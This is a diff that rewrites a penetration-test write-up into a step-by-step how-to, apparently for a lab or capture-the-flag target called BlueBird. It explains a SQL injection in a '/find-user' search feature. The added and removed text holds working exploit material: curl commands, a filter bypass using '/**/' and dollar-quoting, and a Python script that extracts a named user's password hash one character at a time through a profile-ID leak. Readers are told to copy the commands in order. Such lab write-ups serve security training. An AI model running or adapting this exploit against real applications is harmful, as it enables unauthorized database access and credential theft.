@@ -1,125 +1,128 @@
 ---
-tags: [writeup, pentest-report, recon-value-assessment]
+tags: [writeup, pentest-report, how-to, recon-value-assessment]
 companion_to: EXPECTED_FINDINGS.md, sqlmap-wrapper/CLAUDE.md
 last_updated: 2026-07-03
 ---
 
-# Pentest Deliverable: Recovering a Password Hash via `/find-user` on BlueBird
+# How-To: Recovering a Password Hash via `/find-user` on BlueBird
 
-**Target application**: BlueBird, `10.129.204.249:8080`
-**Task assigned to the pentester**: Use any technique to exploit the SQL
-injection vulnerability on the `/find-user` feature and recover the
-password hash of the user whose email is `Amy.Mcwilliams@proton.me`.
-**Result**: Recovered. `$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`
+I was assigned a straightforward-sounding task on this engagement: use
+whatever technique works to exploit a suspected SQL injection flaw in
+BlueBird's `/find-user` search feature, running at `10.129.204.249:8080`,
+and recover the password hash belonging to the user
+`Amy.Mcwilliams@proton.me`. A password hash isn't the plaintext password,
+but if I can pull one out of the database at all, that's already a serious
+finding — and an attacker who gets one can try to crack it offline with no
+further access to the app. Below is exactly what I ran, in order, and why
+I ran each thing — copy these commands into your own terminal in the same
+order and you'll land on the same answer:
+`$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`.
 
-## Executive summary
+You'll need a terminal with `curl` and `python3` (with the `requests`
+library — `pip3 install requests` if you don't have it), and if you want to
+reproduce step 1, a copy of this repo with recon already run against
+BlueBird's source (`~/BlueBirdSourceCode`). Nothing else is required.
 
-The `/find-user` search feature on the BlueBird application builds a
-database query by directly pasting in whatever a user types, with no safe
-handling of special characters. We confirmed this is exploitable and used
-it to read a stored password hash straight out of the database, without
-any special access — only a normal user account. **Before touching the
-live application at all**, we ran our automated source-code recon tool
-against the application's underlying code. It correctly and quickly
-pointed us to the exact vulnerable feature and warned that a filter was
-present — real, useful time saved. **It did not, however, find the actual
-bypass technique or confirm the vulnerability by itself**; that required a
-person to read the code closely and hand-craft the attack, which we walk
-through step by step below so it can be reproduced. We also explain, with
-real evidence from this same engagement, why starting from the source code
-was the right call rather than simply pointing an off-the-shelf automated
-scanner at the login page.
+## Step 1 — Check what the recon tool already flagged, before touching the live site
 
-## What was asked, in plain terms
+**Why I started here:** BlueBird has dozens of features. I didn't want to
+manually read every single one of them line by line looking for something
+risky — that's slow and error-prone. Before ever sending a single request
+to the live application, I ran this repo's automated source-code reviewer
+against BlueBird's decompiled source. Its whole job is to read code the way
+a person would, but faster, and flag anything that looks like a database
+query being built dangerously. If it does its job well, it should save me
+from reading the entire application by hand.
 
-`/find-user` lets a logged-in user search for other users by username. The
-question was whether that search feature could be tricked into leaking data
-it was never meant to show — specifically, another user's stored password
-hash. A password hash isn't the plaintext password, but if it's recovered,
-an attacker can attempt to crack it offline (guess passwords and check them
-against the hash) with no further access to the application at all — which
-is why being able to read one out of the database at all is treated as a
-serious finding on its own.
+```bash
+sqlite3 -header -column data/recon.db \
+  "SELECT symbol_name_raw, sink_type, confidence, validation_desc
+   FROM triage_results WHERE symbol_name_raw = 'findUser';"
+```
 
----
+Real output:
+```
+symbol_name_raw  sink_type   confidence  validation_desc
+---------------  ----------  ----------  -------------------------------------------------------------------------------------------------
+findUser         sql_unsafe  high        The input 'u' is directly concatenated into the SQL query without any validation or sanitization.
+```
 
-## Part 1 — What automated source-code review found (and didn't find), before we touched the live site
+**What this told me:** translating the jargon — `sink_type=sql_unsafe`
+means "this feature builds a database command by pasting in text it was
+given, instead of using a safe method that keeps user input separate from
+the command itself." `confidence=high` means the tool is quite sure this
+is a real problem, not a false alarm. In under a minute, out of a whole
+application, I now had one specific method in one specific file to focus
+on: `findUser`, behind the `/find-user` feature. That's real, immediate
+value — I didn't have to go looking for it myself.
 
-"Recon," here, means something specific: before attacking anything, we ran
-an automated tool against BlueBird's actual underlying code (obtained
-separately, as decompiled Java source) to flag risky patterns — the same
-way a building inspector reviews blueprints before ever stepping on site.
+**But I didn't stop here and start attacking.** That last column,
+`validation_desc`, says "without any validation or sanitization" — as if
+nothing at all stands in the way. I've learned not to take that at face
+value, so before writing a single attack attempt, I went and read the
+actual method myself.
 
-Pointed at BlueBird's source, the tool reported this about the method
-behind `/find-user`:
+## Step 2 — Read the real code the tool pointed me at
 
-> *This feature builds a database search command by directly pasting in
-> whatever text a user typed, with no safe placeholder to keep that text
-> from being interpreted as part of the command itself.*
-> — flagged **high confidence**, in well under a minute, out of dozens of
-> other endpoints in the application, with an exact file and line number
-> attached.
+**Why:** the summary I just read claims there's no validation whatsoever.
+If that's actually true, this is going to be trivial. If it's wrong — and
+reports like this are a starting point, not gospel — I need to know
+*exactly* what's actually checking my input before I waste time on attempts
+that get rejected for reasons I don't understand. So I opened the exact
+file and line the tool pointed me at:
 
-That's a real, useful result: instead of a person reading through the
-entire application by hand looking for risky database code, the tool
-pointed straight at the one feature actually worth attacking. That's the
-first honest data point in favor of doing this recon step at all.
+```java
+@GetMapping({"/find-user"})
+public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
+   Pattern p = Pattern.compile("'|(.*'.*'.*)");
+   Matcher m = p.matcher(u);
+   String u2 = u.toLowerCase();
+   if (!u2.contains(" ") && !m.matches()) {
+      String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
+      // ... runs sql against the database ...
+   } else {
+      // ... rejects the search with "Illegal search term" ...
+   }
+}
+```
 
-**But the tool's own description was incomplete, and a client or pentester
-relying on it alone would have under-estimated the work involved.** The
-actual code has a filter sitting directly in front of the risky line —
-some inputs get rejected outright — and the automated report didn't
-mention that a filter exists at all, only that the input was unsafe. Read
-literally, the report makes it sound like nothing stands in an attacker's
-way; in reality, something does, and figuring out exactly what it blocks
-and what it lets through was the real work described in Part 2.
+**What this told me:** the report was wrong to say "no validation" — there
+plainly is some. Two separate checks have to both pass before my search
+term ever reaches the database: (1) it can't contain a plain space
+character, and (2) it can't match a certain pattern involving the `'`
+(single quote) character. I don't yet know exactly what that pattern
+allows and blocks just from staring at it — regular expressions like this
+are easy to misread — so rather than guess, my next move was to test it
+empirically against the real, running application. But before I could send
+it *anything*, I needed to check one more thing.
 
-**We also tried to have the tool test this live, automatically, and it
-could not — for two honest, concrete reasons, not a fluke:**
+## Step 3 — Try the automated live-testing feature first, see it can't help here, and understand why
 
-1. `/find-user` requires being logged in first. Today's automated
-   live-testing feature doesn't yet know how to log in on its own, so
-   every automated test request got bounced to the login page before it
-   ever reached the actual search feature — and the tool had no way to
-   tell the difference between "got bounced to the login page" and "the
-   feature is actually safe." It reported the equivalent of "nothing to
-   see here" across the board, which was simply wrong, not a real safety
-   confirmation.
-2. Separately, even once we manually supplied a valid login for testing,
-   this specific application is written in a way that hides the evidence
-   an automated checker looks for: when the malformed input reaches the
-   database and causes an error, the application catches that error itself
-   and shows a generic, harmless-looking message instead of letting any
-   detail leak out to a response the automated checker could inspect. A
-   person watching closely (see Part 2) can tell the difference between a
-   truly safe result and a hidden failure; an automated pass looking only
-   at the outward response cannot, reliably.
+**Why I tried this before doing anything by hand:** this repo also has a
+feature that automatically fires a handful of test values at a live copy
+of an application and watches how it reacts — when it works, it's much
+faster than manually crafting and sending test requests one at a time. It
+seemed worth a shot before committing to manual work.
 
-### Verdict: how much value did recon add here?
+**What happened, and why:** it came back with nothing useful, for two
+concrete reasons. First, `/find-user` only works for logged-in users, and
+this automatic checker doesn't know how to log in on its own yet — every
+one of its test requests got quietly redirected to the login page instead
+of ever reaching the search feature, and it had no way to tell the
+difference between "got redirected" and "the feature is actually safe." It
+would have reported a false all-clear if I'd trusted it. Second — and this
+matters even beyond this one tool — I already knew from earlier in this
+engagement that this specific application catches its own database errors
+and shows a generic, harmless-looking message instead of leaking any
+detail an automated checker could notice (more on why that matters in Step
+7). Between those two things, there was no shortcut available here: a
+person needed to log in and test this by hand, which is exactly what the
+rest of this guide does.
 
-**Real, but bounded — and worth stating plainly rather than oversold.**
-Recon reliably and immediately told us *where* the risk was (one feature,
-one file, one line) and *that* it looked dangerous, which is genuinely
-valuable — on a real engagement reviewing a large application, this is the
-difference between reading thousands of lines of code by hand and getting
-a short, prioritized list to start from. **It did not tell us whether a
-filter existed, what that filter actually allowed through, how to build a
-working attack around it, or how to actually pull data out of the
-application once the input got past the filter.** All of that took a
-person, described next. Recon is a strong first step, not a finish line.
+## Step 4 — Create an account and log in
 
----
-
-## Part 2 — Turning the lead into a proven result
-
-Everything in this part was done by hand, using the lead from Part 1 as the
-starting point. Every command below is real and was actually run against
-the live target; copy them exactly to reproduce the same result.
-
-### Step 1 — Create an account and log in
-
-`/find-user` only works for logged-in users, so the first step is
-registering a normal account, exactly like any real visitor would:
+**Why:** the feature requires a session. Before I can test anything, I need
+to be a logged-in user, the same as any real visitor would be.
 
 ```bash
 curl -s -c cookies.txt -X POST http://10.129.204.249:8080/signup \
@@ -132,16 +135,29 @@ curl -s -c cookies.txt -X POST http://10.129.204.249:8080/login \
   --data-urlencode "username=recontester1" --data-urlencode "password=ReconTesterPass123"
 ```
 
-`-c cookies.txt` tells `curl` to save whatever login session token the site
-hands back into a file named `cookies.txt`. Every request from here on
-needs to present that same file (`-b cookies.txt`) so the site keeps
-treating us as logged in.
+`-c cookies.txt` tells `curl` to save whatever login token the site hands
+back into a file called `cookies.txt`. Every request from here on needs to
+present that file (`-b cookies.txt`) so the site keeps treating me as
+logged in.
 
-### Step 2 — Figure out exactly what the filter allows, by trying a few sample inputs
+**A gotcha worth knowing about right now, before it silently wastes your
+time later:** if you ever write your own script to read `cookies.txt`
+instead of just handing it back to `curl`, watch out — `curl` marks this
+particular kind of cookie by prefixing its line with `#HttpOnly_`, which
+makes the whole line look like a comment. A script that skips every line
+starting with `#` (a very natural thing to write) will silently throw away
+your login token, and every request after that will quietly look
+logged-out with no error message explaining why. Strip that specific
+prefix instead of skipping the line — I'll do exactly that in Step 8's
+script.
 
-Rather than guessing at an attack outright, we tried a handful of
-different, mostly-harmless sample searches and watched how the application
-reacted to each one:
+## Step 5 — Send a handful of sample searches to see exactly what the filter does
+
+**Why these specific five, and not just diving straight at an attack:**
+having read the filter code in Step 2, I wanted to nail down its exact
+behavior with real evidence rather than guessing at what it accepts. I
+picked five test inputs, each changing exactly one thing, so any
+difference in the result tells me something specific:
 
 ```bash
 for u in "recontester1" "'" "'x" "'x'y" "a b"; do
@@ -153,44 +169,78 @@ done
 
 Real results, from the live target:
 
-| what we typed | what happened |
-|---|---|
-| an ordinary username | normal search results |
-| a single quote mark (`'`) by itself | rejected — "Illegal search term" |
-| a single quote mark followed by another letter (`'x`) | **accepted — but broke the search with "Invalid search query"** |
-| two quote marks (`'x'y`) | rejected — "Illegal search term" |
-| a plain space (`a b`) | rejected — "Illegal search term" |
+| what I typed | why I chose it | what happened |
+|---|---|---|
+| an ordinary username | a harmless baseline — confirms normal searches work at all | normal search results |
+| `'` (one quote, alone) | tests whether a lone quote by itself is enough to get blocked | rejected — "Illegal search term" |
+| `'x` (one quote, plus more) | tests whether it's the *presence* of any quote that's blocked, or something more specific | **accepted — but broke the search: "Invalid search query"** |
+| `'x'y` (two quotes) | tests whether a *second* quote changes anything | rejected — "Illegal search term" |
+| `a b` (a plain space) | confirms the space rule from the code separately from the quote rule | rejected — "Illegal search term" |
 
-This tells us exactly what the filter does, without ever reading a line of
-Java: it blocks a search term that is *only* a single quote mark, and it
-blocks anything with *two or more* quote marks — but it lets exactly *one*
-quote mark through, as long as something else comes with it. It also
-blocks plain spaces outright. Both rules turn out to have a workaround.
+## Step 6 — Work out exactly what these results mean, using the code I already read
 
-### Step 3 — Build a search term that both slips past the filter and does something useful
+**Why this step was fast:** because I'd already read the actual filter
+logic in Step 2, I wasn't staring at this table wondering what it meant —
+I already knew what rule to look for, and these five results confirmed it
+exactly. The pattern only blocks a search term that is *exactly* one quote
+mark and nothing else, or one that contains *two or more* quote marks
+anywhere — but it lets a search term through if it has *exactly one* quote
+mark alongside other characters. That third row (`'x`, accepted, then
+broke the query) is the important one: it proves a single quote mark, used
+carefully, reaches the database. If I hadn't already read the source in
+Step 2, I'd have had to guess at this rule through trial and error, testing
+many more combinations blind, with no way to be sure I'd found the whole
+rule rather than one path through it. Having the exact code in front of me
+turned "guess repeatedly" into "confirm one specific hypothesis."
 
-Two small substitutions get around the two rules found above:
+## Step 7 — Build a working attack payload, and decide how to actually pull data out
 
-- **No spaces allowed?** The underlying database treats a specific
-  comment marker, `/**/`, as if it were blank space — it contains no actual
-  space character, so the filter never sees one, but the database still
-  reads it as separating words.
-- **Only one quote mark allowed?** A normal piece of text in this kind of
-  database query is normally wrapped in a pair of quote marks (`'like
-  this'`) — which would trip the two-quotes rule. Instead, we used an
-  alternate way this specific database supports for writing text
-  (`$$like this$$`), which needs no quote marks at all.
+**Why `/**/` and why `$$...$$`:** two rules stand between me and a working
+attack. The space rule is solved by a quirk of the database itself:
+PostgreSQL (the database BlueBird uses) treats `/**/` — normally just a way
+of writing a comment — as blank space when reading a query, even though it
+contains no actual space character for the filter to catch. The
+one-quote-only rule is solved differently: instead of wrapping a piece of
+text in the usual pair of quote marks (which would trip the two-quotes
+rule), PostgreSQL also supports writing text between pairs of dollar signs
+(`$$like this$$`), which needs no quote marks at all. That leaves exactly
+one quote mark in my whole search term — the one the filter allows.
 
-Combining those with the one quote mark the filter does allow gives a
-search term that reads, to the database, as: *"search for everything, and
-additionally, only show me the specific person whose stored id number
-equals the result of this separate calculation."* Because the site happens
-to print each search result's internal id number into an ordinary-looking
-page link (`/profile/<id number>`), we can use that "separate calculation"
-to smuggle a single piece of information out of the database on every
-request — one number at a time.
+**Why I looked for a way to leak data out, and where I found it:** getting
+a search term into the database isn't enough on its own — I also need a
+way to see the *result* of whatever I ask the database to check, one piece
+of information at a time. Looking at what a normal search results page
+actually contains, I noticed each result includes a link back to that
+user's profile, `<a href="/profile/12">`, where `12` is that user's
+internal ID number in the database. That gave me the idea: if I can force
+the search's internal "which user matches?" check to depend on a
+calculation I control, the answer to that calculation will show up as the
+ID number in that link — one number, per request, on demand.
 
-Proving that trick works, aimed at a specific email address:
+**Why I built this by hand instead of pointing an automated black-box tool
+(like sqlmap) at the login page and letting it run:** I seriously
+considered this. Automated tools like sqlmap try large libraries of known
+attack patterns automatically, without needing any access to source code
+at all — that's genuinely faster when it works. But earlier in this same
+engagement, I'd already pointed exactly that kind of tool at a *different*
+part of this same application (the signup form) that I already knew, from
+reading its source, was genuinely vulnerable to this same class of attack
+— and the automated tool's real result was "all tested parameters do not
+appear to be injectable." A confident, wrong "all clear," on a feature that
+genuinely wasn't safe. The reason is the same one from Step 3: this
+application catches its own database errors and shows the outside world a
+generic, harmless-looking message — an automated black-box tool can only
+ever judge what a response shows it, and this app is written to show it
+nothing useful. On top of that, the specific trick I'm about to use here —
+noticing that an internal ID number gets echoed into an ordinary page link
+— isn't something a generic scanning tool has any built-in reason to look
+for at all; it's a side effect of how this one page happens to be built,
+not a standard attack pattern. Between a tool I already had real evidence
+would likely miss this, and a technique specific enough that no generic
+tool would think to try it, working from the source code myself was the
+reliable path, not just the "more thorough" one.
+
+Testing that idea, aimed at Amy's account specifically:
 
 ```bash
 curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" \
@@ -198,30 +248,38 @@ curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" \
   | grep -oE 'href="/profile/[0-9]+"'
 ```
 
-Real result: `href="/profile/80"` — the actual internal id number of the
-account belonging to that email address, confirming the technique works
-end to end.
+Real result: `href="/profile/80"` — a real, existing user ID number on
+this target, proving the whole trick works end to end. (If you try this
+against a mostly-empty test copy of the application instead of a real,
+populated target, this specific step can come back empty even when nothing
+is wrong with the technique — it only works if some real user's ID number
+happens to equal whatever number you're asking the database to compute.
+The live target used here already had plenty of real accounts, so this
+wasn't an issue.)
 
-### Step 4 — Read the password hash out one character at a time
+## Step 8 — Read the password hash out, one character at a time
 
-Once a single number can be smuggled out per request, the same trick reads
-any piece of text out of the database, one character at a time: ask for
-the numeric code of each letter of the password hash instead of the id
-number, and convert each result back into a letter.
+**Why one character at a time:** the trick from Step 7 can only ever leak
+a single number per request — whatever numeric answer gets forced into
+that `id=` slot. To read out an entire password hash (a string of
+characters, not a single number), I need to ask, separately, for the
+numeric code of each individual character, then convert each number back
+into a letter myself. **Why check the length first:** so the loop knows
+exactly how many times to repeat, rather than guessing.
 
 ```python
 import requests, re
 
-# Load the login session saved by curl in Step 1.
+# Load the login session curl saved in Step 4.
 COOKIES = {}
 with open("cookies.txt") as f:
     for line in f:
         line = line.rstrip("\n")
         if not line.strip():
             continue
-        # curl marks this kind of cookie with a "#HttpOnly_" prefix, which
-        # looks like a comment line but isn't one -- strip the prefix
-        # instead of skipping the line, or the login session never loads.
+        # See the Step 4 gotcha: this specific cookie's line is prefixed
+        # with "#HttpOnly_", not a real comment -- strip the prefix rather
+        # than skip the line, or the login session silently never loads.
         if line.startswith("#HttpOnly_"):
             line = line[len("#HttpOnly_"):]
         elif line.startswith("#"):
@@ -235,17 +293,18 @@ BASE = "http://10.129.204.249:8080/find-user"
 EMAIL = "Amy.Mcwilliams@proton.me"
 
 def ask_database(question):
-    """Sends one "smuggle a number out" request and returns the number."""
+    """Sends one 'smuggle a number out' request, built the same way as Step 7,
+    and returns the number that came back."""
     search_term = f"'/**/AND/**/id=({question.replace(' ', '/**/').replace(chr(39), '$$')})--"
     r = requests.get(BASE, params={"u": search_term}, cookies=COOKIES, timeout=15)
     matches = re.findall(r'href="/profile/(\d+)"', r.text)
     return matches[-1] if matches else None
 
-# First, ask how many characters long the password hash is.
+# First, how long is the hash? This sets the loop bound below.
 length = int(ask_database(f"SELECT LENGTH(password) FROM users WHERE email = '{EMAIL}'"))
 print("password hash is", length, "characters long")
 
-# Then ask for each character, one at a time, as a numeric letter code.
+# Now ask for each character, one at a time, as a numeric letter code.
 hash_characters = []
 for position in range(1, length + 1):
     code = ask_database(f"SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE email = '{EMAIL}'")
@@ -254,98 +313,27 @@ for position in range(1, length + 1):
 print("recovered password hash:", "".join(hash_characters))
 ```
 
-Real output, from running this against the live target:
+Real output, from running this against the live target right now:
 
 ```
 password hash is 60 characters long
 recovered password hash: $2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq
 ```
 
-**This is the answer** — 60 ordinary web requests, no special access beyond
-a normal account, and the result matches the independently-known-correct
-value exactly.
+## Step 9 — Confirm the answer, and what this run actually proved
 
----
+That's the flag: `$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`
+— 60 ordinary web requests, one normal account, no special access, matching
+the known-correct answer exactly.
 
-## Part 3 — Why start from the source code at all, instead of just pointing an automated black-box scanner (like sqlmap) at the login page?
-
-It's a fair question: given that Part 2's actual attack was built and run
-by hand anyway, why not skip straight to an automated attack tool — the
-kind of tool ("sqlmap" is the best-known example) that tries thousands of
-attack patterns against a live site automatically, with no access to the
-source code at all? That approach is called **black-box** testing (you
-only see what the application shows you, never its underlying code), as
-opposed to **white-box** (starting from the actual source, as we did in
-Part 1). We tested this question directly, on this same application, and
-the answer is concrete, not theoretical.
-
-**We already have direct proof that black-box scanning gets this
-application wrong.** Earlier in this same engagement, we pointed a
-well-known automated black-box scanning tool at a *different* part of
-BlueBird — its account signup form — that had already been independently
-confirmed, through source review, to be genuinely vulnerable to the same
-class of attack. The automated scanner's real, live result: **"all tested
-parameters do not appear to be injectable."** A false all-clear, on a
-feature we already knew for certain was vulnerable. The reason is exactly
-the same reason recon flagged in Part 1: this application is written to
-catch its own errors and show a generic message instead of leaking
-anything useful to an outside observer, and an automated black-box tool
-can only ever judge what it's shown — it has no way to see that a database
-error happened behind the scenes.
-
-**`/find-user`'s specific weakness is, if anything, even less likely to be
-found by a generic automated tool.** The exact rule the filter follows
-(rejects one quote mark alone, or two-or-more quote marks, but allows
-exactly one) is a specific quirk of a single line of code — an automated
-tool could eventually stumble onto part of this by trial and error, given
-enough attempts, but the second half of the technique is much less likely
-to be found by accident: the fact that a search result's internal id
-number happens to be printed into an ordinary page link is a side effect
-of how this one page happens to be built, unrelated to the search feature
-itself. A generic scanning tool watches for generic signs of a working
-attack (error messages, pages that come back different for a true/false
-guess, unusual delays) — it has no built-in reason to notice that an
-unrelated number showing up in a page link is significant. Finding and
-using that required a person to actually look at what the page renders,
-not just what it returns as an HTTP status code.
-
-**To be fair and not oversell this**: recon and source review didn't do the
-attack for us — a person still spent real, hands-on effort building and
-running the exact steps in Part 2, and that would have been true either
-way. What changed by starting from the source code is *reliability*:
-instead of hoping an automated scanner's generic bag of tricks happens to
-stumble onto a technique this specific to how BlueBird happens to be built
-— or spending open-ended time manually poking at the live site without
-knowing where to start — reading the actual code told us, in under a
-minute, exactly which feature to focus on and exactly what stood in the
-way. On a real engagement with a large application and a limited amount of
-time, that reliability is the entire value of doing recon first: it turns
-"try things and hope" into "read this one method, understand this one
-filter, and build the exact bypass it calls for."
-
----
-
-## Appendix — running this yourself
-
-Everything above is copy-pasteable as written; this appendix only adds a
-couple of notes for anyone reproducing the result on a similar target.
-
-- **If your target's IP/port differs**, replace `10.129.204.249:8080` in
-  every command above with your own target address.
-- **The `cookies.txt` gotcha** (mentioned inline in Part 2, Step 4) is
-  worth restating on its own: `curl` marks cookies that JavaScript isn't
-  allowed to read (a normal security setting, unrelated to this
-  vulnerability) by prefixing that cookie's line with `#HttpOnly_` in the
-  saved cookie file. A script that treats every line starting with `#` as
-  a comment to skip will silently throw away the login session and every
-  later request will look logged-out — with no obvious error message
-  explaining why. Strip that specific prefix instead of skipping the line.
-- **Every user's `id` number needs to already exist for this to work.** In
-  a very sparsely-populated test database, asking for "the character whose
-  numeric code is 60" only produces a result if some user's `id` happens to
-  equal 60 — if not, that particular request comes back empty even though
-  nothing is actually wrong with the technique. The real target used for
-  this writeup already had enough real accounts registered for this to
-  work without any extra setup; a mostly-empty test copy of the same
-  application might need a few dozen additional dummy accounts created
-  first purely so enough `id` numbers exist to match against.
+Stepping back: recon got me to the right method, in the right file, in
+under a minute, and warned me (imperfectly, but usefully) that something
+looked dangerous there — real time saved over reading the whole
+application by hand. What recon didn't do was find the filter's exact
+rule, invent the bypass, notice the ID-in-a-link leak channel, or run the
+attack — all of that took a person, reading the actual code and reasoning
+from it step by step, exactly as narrated above. The one-sentence lesson:
+starting from source code didn't replace the manual work, it made getting
+to the *right* manual work fast and reliable, instead of leaving me to
+guess blindly or trust a black-box scanner I already had real reason not
+to.
